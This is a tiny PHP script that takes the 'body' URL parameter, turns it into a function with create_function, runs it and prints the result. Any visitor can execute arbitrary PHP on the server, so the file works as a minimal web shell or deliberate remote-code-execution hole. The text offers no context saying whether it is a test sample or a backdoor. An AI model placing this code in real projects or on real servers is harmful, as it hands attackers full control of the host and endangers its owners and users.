<?php
$body = $_GET['body'] ?? 'return 1;';
$f = create_function('', $body);
echo $f();
?>